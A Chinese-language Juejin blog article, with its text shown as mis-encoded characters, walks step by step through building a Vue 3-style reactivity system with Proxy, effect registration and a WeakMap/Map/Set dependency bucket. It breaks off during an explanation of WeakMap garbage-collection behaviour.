data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦å­¦ä¹ å“åº”å¼ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2025-12-30T02:21:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨é£é£é›¨"/> <meta itemprop="url" content="https://juejin.cn/user/4107431170541575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦å­¦ä¹ å“åº”å¼ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431170541575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨é£é£é›¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:21:17.000Z" title="Tue Dec 30 2025 02:21:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»34åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å­¦ä¹ æœ¬ç« è¦å°è¯•è§£å†³çš„é—®é¢˜ï¼š</p>
<ul>
<li>å¦‚ä½•é¿å…æ— é™é€’å½’</li>
<li>ä¸ºä»€ä¹ˆéœ€è¦åµŒå¥—å‰¯ä½œç”¨å‡½æ•°</li>
<li>ä¸¤ä¸ªå‰¯ä½œç”¨å‡½æ•°ä¹‹é—´ä¼šäº§ç”Ÿå“ªäº›å½±å“</li>
</ul>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯å“åº”å¼ç³»ç»Ÿï¼Ÿ</h2>
<p>æ­£å¸¸æƒ…å†µä¸‹ä¸€ä¸ªå‡½æ•°æ‰§è¡Œå®Œä»¥åï¼Œå°±ä¸ä¼šå†æ¬¡æ‰§è¡Œã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">//å‰¯ä½œç”¨å‡½æ•°
const <span class="hljs-attr">obj</span> = {text:<span class="hljs-string">"hello world"</span>}
const <span class="hljs-attr">effect</span>=()=&gt;{
   <span class="hljs-attr">document.body.innerText</span> = obj.text<span class="hljs-comment">;</span>
}
</code></pre>
<p>æˆ‘ä»¬åœ¨ä»£ç æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œå¦‚æœæˆ‘ä»¬çš„æ•°æ®å†æ¬¡å‘ç”Ÿäº†å˜åŒ–ï¼Œå°±éœ€è¦å†æ‰§è¡Œä¸€æ¬¡å‡½æ•°ã€‚</p>
<p>å¦‚æœæˆ‘ä¸æƒ³è‡ªå·±è°ƒç”¨ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>è¿™é‡Œè®©æˆ‘æƒ³åˆ°äº†è§‚å¯Ÿè€…æ¨¡å¼</p>
<p>ä½ çš„å‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œï¼Œæ— éå°±æ˜¯è¯»å–è¿™ä¸ªæ•°æ®ï¼Œç„¶åæŠŠè¿™ä¸ªæ•°æ®èµ‹å€¼æˆ–è€…æ“ä½œæˆ–è€…å¼‚æ­¥ç­‰ã€‚</p>
<p>éƒ½æ˜¯åŸºäºè¯»å–ç„¶åè¡ç”Ÿå‡ºæ¥çš„æ“ä½œã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±åœ¨ä½ è¯»å–çš„æ—¶å€™ ï¼ŒæŠŠä½ æƒ³è¦æ‰§è¡Œçš„å‰¯ä½œç”¨å‡½æ•°å­˜å‚¨èµ·æ¥ã€‚</p>
<p>ç­‰æˆ‘è®¾ç½®èµ‹å€¼çš„æ—¶å€™ï¼Œåœ¨æŠŠä½ çš„å‡½æ•°é‡æ–°æ‰§è¡Œä¸€éï¼Œé€šçŸ¥ä½ ï¼Œä¸å°±å®Œæˆäº†ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯å“åº”å¼çš„æ¦‚å¿µï¼Œä½†æ˜¯å®ƒå¹¶ä¸å®Œå–„ã€‚</p>
<h2 data-id="heading-1">01 - å®ç°ä¸€ä¸ªåŸºç¡€çš„å“åº”å¼</h2>
<p>é¦–å…ˆæˆ‘ä»¬å®ç°ä¸€ä¸ªåŸºç¡€çš„å“åº”å¼å®ç°ã€‚</p>
<p>å®ƒçš„åŸç†æ˜¯</p>
<ul>
<li><strong>å½“æˆ‘ä»¬è¯»å–çš„æ—¶å€™ï¼ŒæŠŠè¯»å–æ“ä½œçš„å‰¯ä½œç”¨å‡½æ•°å­˜å‚¨åˆ°æ¡¶é‡Œ</strong></li>
<li><strong>å½“æˆ‘ä»¬è®¾ç½®çš„æ—¶å€™ï¼ŒæŠŠå­˜å‚¨åˆ°æ¡¶é‡Œçš„å‰¯ä½œç”¨å‡½æ•°æ‹¿å‡ºæ¥æŒ¨ä¸ªæ‰§è¡Œä¸€éã€‚</strong></li>
</ul>
<p><strong>å®é™…æ‰§è¡Œæ—¶å‘ç°çš„é—®é¢˜ï¼š</strong></p>
<p>å¦‚æœæƒ³è¦è§¦å‘è·å–å’Œè®¾ç½®çš„ç›‘å¬ï¼Œæˆ‘ä»¬çš„æ“ä½œå°±éœ€è¦ä½¿ç”¨ä»£ç†å¯¹è±¡ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡æ‹¿æ•°æ®ï¼Œä»¥åŠè®¾ç½®æ•°æ®ï¼Œæ‰èƒ½æ­£å¸¸æ‰§è¡Œã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fooimvw9a6j.feishu.cn%2Fwiki%2FJfRHwmXVei69WMk1SjKcCqSon6e" target="_blank" title="https://ooimvw9a6j.feishu.cn/wiki/JfRHwmXVei69WMk1SjKcCqSon6e" ref="nofollow noopener noreferrer">vue3ä½¿ç”¨ä¸ºä»€ä¹ˆè¦å‡çº§Object.defineProperty ä¸ºproxy</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
<span class="hljs-keyword">const</span> data = {<span class="hljs-attr">text</span>:<span class="hljs-string">"hello world"</span>}
<span class="hljs-comment">//å­˜å‚¨å‰¯ä½œç”¨çš„æ¡¶</span>
<span class="hljs-keyword">const</span> bucket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
<span class="hljs-comment">//å¯¹åŸå§‹æ•°æ®è¿›è¡Œä»£ç†</span>
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(data,{
   <span class="hljs-comment">//å¯¹è¯»å–æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">get</span>(<span class="hljs-params">target,key</span>){
      <span class="hljs-comment">//å°†å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ¡¶é‡Œ</span>
      bucket.<span class="hljs-title function_">add</span>(effect)
      <span class="hljs-keyword">return</span> target[key]
   },
   <span class="hljs-comment">//å¯¹è®¾ç½®æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">set</span>(<span class="hljs-params">target,key,value</span>){
      <span class="hljs-comment">//è®¾ç½®æ“ä½œ</span>
      target[key] = value
      <span class="hljs-comment">//æŠŠå‰¯ä½œç”¨å‡½æ•°ä»æ¡¶é‡Œå–å‡ºæ¥ å¹¶è¿›è¡Œæ‰§è¡Œ</span>
      bucket.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span>=&gt;</span><span class="hljs-title function_">fn</span>())
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
   }
})
<span class="hljs-comment">//å‰¯ä½œç”¨å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">effect</span>=(<span class="hljs-params"/>)=&gt;{
   <span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨ ä»£ç†çš„å¯¹è±¡</span>
   <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span> = obj.<span class="hljs-property">text</span>;
}
<span class="hljs-comment">//æ‰§è¡Œ</span>
<span class="hljs-title function_">effect</span>()
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
   <span class="hljs-comment">//è®¾ç½®çš„æ—¶å€™ ä¹Ÿæ˜¯ä½¿ç”¨ä»£ç†å¯¹è±¡ æ‰èƒ½æ­£ç¡®çš„è§¦å‘</span>
   obj.<span class="hljs-property">text</span> = <span class="hljs-string">"hello ä½ å¥½"</span>
},<span class="hljs-number">1000</span>)
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªéå¸¸åŸºç¡€çš„å“åº”å¼å®ç°ã€‚å®ƒè¿˜æœ‰ä»¥ä¸‹å…¶ä»–çš„é—®é¢˜ï¼Œæ‰èƒ½å¤Ÿé€æ­¥å®Œå–„</p>
<ul>
<li>æ³¨å†Œå‰¯ä½œç”¨å‡½æ•°çš„æ–¹å¼ç›´æ¥å†™æ­»</li>
<li>æˆ‘ä»¬ç›‘å¬äº†æ‰€æœ‰çš„å±æ€§ï¼Œä½†æ˜¯æˆ‘ä»¬åªæƒ³ç›‘å¬å¯¹è±¡çš„ä¸€ä¸ªå±æ€§æ€ä¹ˆåŠå‘¢ï¼Ÿ</li>
<li>å¦‚æœæˆ‘æƒ³æ³¨å†Œä¸€ä¸ªå‰¯ä½œç”¨å‡½æ•°åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥ æ¥å®Œå–„å§ã€‚</p>
<h2 data-id="heading-2">02-å®Œå–„æ³¨å†Œå‡½æ•°æœºåˆ¶ï¼Œå®ç°å¯ä»¥æ³¨å†ŒåŒ¿åå‡½æ•°</h2>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ³¨å†Œå‡½æ•°çš„å·¥å…·ï¼Œé€šè¿‡å®ƒæ¥è¿›è¡Œå‡½æ•°çš„æ³¨å†Œã€‚</p>
<ul>
<li>è®¾è®¡ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä¸´æ—¶å­˜å‚¨ è¦æ³¨å†Œçš„å‰¯ä½œç”¨å‡½æ•°</li>
<li>æ³¨å†Œå‡½æ•°çš„æ—¶å€™ å…ˆæŠŠè¿™ä¸ªå‡½æ•°èµ‹ç»™å…¨å±€ä¸´æ—¶å˜é‡ï¼Œç„¶åç«‹åˆ»æ‰§è¡Œ</li>
<li>ç«‹å³æ‰§è¡Œä¼šè§¦å‘ å¯¹è±¡çš„è·å–æœºåˆ¶ï¼Œç„¶åè¢«æ‹¦æˆªï¼Œæˆ‘ä»¬åœ¨æ‹¦æˆªå‡½æ•°ä¸­ åˆ¤æ–­ å…¨å±€ å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±æŠŠè¯¥å˜é‡ä¿å­˜åˆ°æ¡¶é‡Œã€‚</li>
</ul>
<blockquote>
<p>å®ƒæ˜¯æ€ä¹ˆçŸ¥é“éœ€è¦ç›‘å¬è°çš„å‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼šå’±ä»¬å…ˆæ‰§è¡Œä¸€éï¼Œçœ‹çœ‹å®ƒä¼šè§¦å‘è°çš„æ‹¦æˆªï¼Œç„¶åå†è§¦å‘æ‹¦æˆªé‚£é‡Œï¼ŒæŠŠåˆšåˆšæ‰§è¡Œçš„å‡½æ•°ï¼Œå­˜æ”¾åˆ°åˆé€‚çš„æ¡¶é‡Œå°±å¯ä»¥äº†</p>
</blockquote>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
<span class="hljs-keyword">const</span> data = {<span class="hljs-attr">text</span>:<span class="hljs-string">"hello world"</span>}
<span class="hljs-comment">//å­˜å‚¨å‰¯ä½œç”¨çš„æ¡¶</span>
<span class="hljs-keyword">const</span> bucket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
<span class="hljs-comment">//å…¨å±€å˜é‡å­˜å‚¨ ä¸´æ—¶å­˜å‚¨ éœ€è¦æ³¨å†Œçš„å‡½æ•°</span>
<span class="hljs-keyword">let</span> activeEffect;
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">registerEffect</span>=(<span class="hljs-params">fn</span>)=&gt;{
   <span class="hljs-keyword">if</span> (!fn) <span class="hljs-keyword">return</span> ;
   <span class="hljs-comment">//æŠŠæ³¨å†Œå‡½æ•°äº¤ç»™å…¨å±€å˜é‡</span>
   activeEffect = fn;
   <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
   <span class="hljs-title function_">fn</span>()
}
<span class="hljs-comment">//å¯¹åŸå§‹æ•°æ®è¿›è¡Œä»£ç†</span>
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(data,{
   <span class="hljs-comment">//å¯¹è¯»å–æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">get</span>(<span class="hljs-params">target,key</span>){
      <span class="hljs-comment">//å°†å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ¡¶é‡Œ</span>
           <span class="hljs-keyword">if</span>(activeEffect){
                 bucket.<span class="hljs-title function_">add</span>(activeEffect)
           }
      <span class="hljs-keyword">return</span> target[key]
   },
   <span class="hljs-comment">//å¯¹è®¾ç½®æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">set</span>(<span class="hljs-params">target,key,value</span>){
      <span class="hljs-comment">//è®¾ç½®æ“ä½œ</span>
      target[key] = value
      <span class="hljs-comment">//æŠŠå‰¯ä½œç”¨å‡½æ•°ä»æ¡¶é‡Œå–å‡ºæ¥ å¹¶è¿›è¡Œæ‰§è¡Œ</span>
      bucket.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span>=&gt;</span><span class="hljs-title function_">fn</span>())
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
   }
})
<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
   <span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨ ä»£ç†çš„å¯¹è±¡</span>
   <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span> = obj.<span class="hljs-property">text</span>;
})
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
   <span class="hljs-comment">//è®¾ç½®çš„æ—¶å€™ ä¹Ÿæ˜¯ä½¿ç”¨ä»£ç†å¯¹è±¡ æ‰èƒ½æ­£ç¡®çš„è§¦å‘</span>
   obj.<span class="hljs-property">text</span> = <span class="hljs-string">"hello ä½ å¥½"</span>
},<span class="hljs-number">1000</span>)
</code></pre>
<p>æˆ‘ä»¬æ”¹è¿›äº†å‡½æ•°æ³¨å†Œæœºåˆ¶ï¼Œ ç°åœ¨æˆ‘ä»¬é€šè¿‡activeEffectå’Œ effect çš„æ­é…ä½¿ç”¨ï¼Œå¯ä»¥å®ç°ç›´æ¥æ³¨å†ŒåŒ¿åå‡½æ•°ï¼Œè€Œä¸åœ¨å…³æ³¨å‡½æ•°çš„å…·ä½“åç§°ã€‚</p>
<h2 data-id="heading-3">03-å®Œå–„æ³¨å†Œå‡½æ•°çš„æ¡¶ï¼Œå®ç°åŸºäºå±æ€§çš„ç›‘å¬è°ƒç”¨</h2>
<p>æˆ‘ä»¬è™½ç„¶å®ç°äº†å¯ä»¥æ³¨å†ŒåŒ¿åå‡½æ•°çš„æ³¨å†Œæœºåˆ¶ï¼Œä½†æ˜¯å½“æˆ‘ä»¬ç›‘å¬çš„å±æ€§æ˜¯a ,ä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œä¿®æ”¹çš„æ˜¯bçš„æ—¶å€™ï¼ŒåŒæ ·ä¼šè°ƒç”¨å‰¯ä½œç”¨å‡½æ•°ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œé‚£æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p>å®é™…ä¸Šæˆ‘ä»¬ç›‘å¬çš„æ˜¯è°å‘¢ ï¼Ÿ æ˜¯ä¸æ˜¯ç›®æ ‡å¯¹è±¡ï¼Ÿæˆ‘ä»¬çš„æ‰§è¡Œå‡½æ•°å’Œè°æŒ‚é’©å‘¢ï¼Ÿç›®æ ‡å¯¹è±¡çš„ç›®æ ‡å±æ€§ã€‚æ‰€ä»¥ å®ƒçš„å…³å¿ƒåº”è¯¥æ˜¯è¿™æ ·çš„</p>
<pre><code class="hljs language-css" lang="css">|<span class="hljs-attr">--target</span>
|--|<span class="hljs-attr">--key</span>
|--|--|<span class="hljs-attr">--effectFn</span>
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæ¡¶æŠ½å–å‡ºæ¥ï¼Œåšæˆä¸€ä¸ªå…¨å±€çš„æ•°æ®å­˜åœ¨ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//å­˜å‚¨å…¨å±€çš„æ¡¶</span>
<span class="hljs-comment">/**
|--target 
|--|--key
|--|--|--effectFn
 */</span>
const bucket = new <span class="hljs-built_in">WeakMap</span>()
<span class="hljs-comment">//åŸå§‹æ•°æ®</span>
const data = {text:<span class="hljs-string">"hello world"</span>}
<span class="hljs-comment">//ç”¨ä¸€ä¸ªå…¨å±€å˜é‡  æ¥ä¸´æ—¶ä¿å­˜ æ³¨å†Œå‡½æ•°</span>
let activeEffect ;
function <span class="hljs-built_in">effect</span>(fn){
    activeEffect = fn;
    <span class="hljs-built_in">fn</span>()
}
<span class="hljs-comment">//é‡å†™æ‹¦æˆªçš„é€»è¾‘</span>
const obj = new <span class="hljs-built_in">Proxy</span>(data,{
    //æ‹¦æˆªè¯»å–çš„æ“ä½œ
    get(target,key){
        <span class="hljs-comment">//00 - åˆ¤æ–­activeEffectæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ ç›´æ¥è¿”å›</span>
        <span class="hljs-built_in">if</span>(!activeEffect) return 
        <span class="hljs-comment">//01- æ ¹æ®ç›®æ ‡å¯¹è±¡è·å– å¯¹åº”çš„ key--&gt;effects</span>
        let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
        <span class="hljs-comment">//å¦‚æœä¸å­˜åœ¨ å°±åˆ›å»º</span>
        <span class="hljs-built_in">if</span>(!depsMap){
            depsMap = new <span class="hljs-built_in">Map</span>()
            bucket<span class="hljs-selector-class">.set</span>(target,depsMap)
        }
        <span class="hljs-comment">//02-æ ¹æ®å±æ€§è·å– å¯¹åº”çš„ å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ— å®ƒæ˜¯ä¸€ä¸ªSet</span>
        let deps = depsMap<span class="hljs-selector-class">.get</span>(key)
        <span class="hljs-built_in">if</span>(!deps){
            deps = new <span class="hljs-built_in">Set</span>()
            depsMap<span class="hljs-selector-class">.set</span>(key,deps)
        }
        <span class="hljs-comment">//03- æŠŠå‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ‹¿åˆ°çš„seté˜Ÿåˆ—é‡Œé¢</span>
        deps<span class="hljs-selector-class">.add</span>(activeEffect)
        <span class="hljs-comment">//è¿”å›å±æ€§çš„å€¼</span>
        return target<span class="hljs-selector-attr">[key]</span>
    },
    <span class="hljs-comment">//æ‹¦æˆªè®¾ç½®çš„æ“ä½œ</span>
    <span class="hljs-built_in">set</span>(target,key,newValue){
        <span class="hljs-comment">//è®¾ç½®å±æ€§å€¼</span>
        target<span class="hljs-selector-attr">[key]</span> = newValue
        <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
        let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
        <span class="hljs-built_in">if</span>(!depsMap) return ;
        <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
       const effects = depsMap<span class="hljs-selector-class">.get</span>(key)
       <span class="hljs-comment">//åˆ¤ç½šæ˜¯å¦å­˜åœ¨ å¹¶æŒ‰ä¸ªæ‰§è¡Œ</span>
       effects &amp;&amp; effects<span class="hljs-selector-class">.forEach</span>(fn=&gt;fn());
    },
})
</code></pre>
<p>æ„å»ºçš„æ•°æ®ç»“æ„ï¼Œåˆ†åˆ«ä½¿ç”¨äº†<code>weakMap,map,set</code></p>
<ul>
<li><code>weakMap</code>ç”± <code>target</code>--&gt;<code>Map </code>æ„æˆ</li>
<li><code>Map</code>ç”± <code>key</code>--<code>Set</code>æ„æˆ</li>
</ul>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†weakMapå’ŒMap ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œä½¿ç”¨weakMap è€Œä¸æ˜¯Mapå‘¢ï¼Ÿ</p>
<h3 data-id="heading-4">WeakMap çš„ä½¿ç”¨è¯´æ˜</h3>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä»–ä»¬ä¸¤ä¸ªçš„åŒºåˆ«å§ï¼š</p>
<ul>
<li>
<p>é¦–å…ˆï¼Œ<code>WeakMap</code>åªæ¥å—å¯¹è±¡ä½œä¸ºé”®åï¼ˆ<code>null</code>é™¤å¤–ï¼‰ï¼Œä¸æ¥å—å…¶ä»–ç±»å‹çš„å€¼ä½œä¸ºé”®åã€‚</p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œ<code>WeakMap</code>çš„é”®åæ‰€æŒ‡å‘çš„å¯¹è±¡ï¼Œä¸è®¡å…¥åƒåœ¾å›æ”¶æœºåˆ¶ã€‚</p>
</li>
<li>
<p>å®ƒçš„é”®åæ‰€å¼•ç”¨çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åƒåœ¾å›æ”¶æœºåˆ¶ä¸å°†è¯¥å¼•ç”¨è€ƒè™‘åœ¨å†…</p>
</li>
</ul>
<p><code>WeakMap</code> çš„é”®ååªèƒ½ä½¿ç”¨å¯¹è±¡ï¼Œè€Œå®ƒå¼•ç”¨çš„å¯¹è±¡åˆä¸ä¼šè®¡å…¥åˆ°åƒåœ¾å›æ”¶æœºåˆ¶é‡Œé¢ï¼Œé‚£ä¹ˆå®ƒçš„ä½œç”¨å°±æ˜¯ä¸¤ä¸ªæ–¹é¢ã€‚</p>
<ul>
<li>ä¸€ã€å¦‚æœweakMapçš„å¼•ç”¨çš„å¯¹è±¡è¢«å…¶ä»–å¯¹è±¡å¼•ç”¨ï¼Œé‚£ä¹ˆå®ƒå±äºå¼ºå¼•ç”¨ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¸ä¼šè§¦å‘</li>
<li>äºŒã€å¦‚æœweakMapçš„å¼•ç”¨çš„å¯¹è±¡å·²ç»æ²¡æœ‰å…¶ä»–çš„å¼•ç”¨äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå·²ç»ä¸è¢«ä»»ä½•ä¸œè¥¿å¼ºå…³è”ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶æœºåˆ¶å°±å¯ä»¥æ­£å¸¸çš„è§¦å‘äº†ã€‚</li>
</ul>
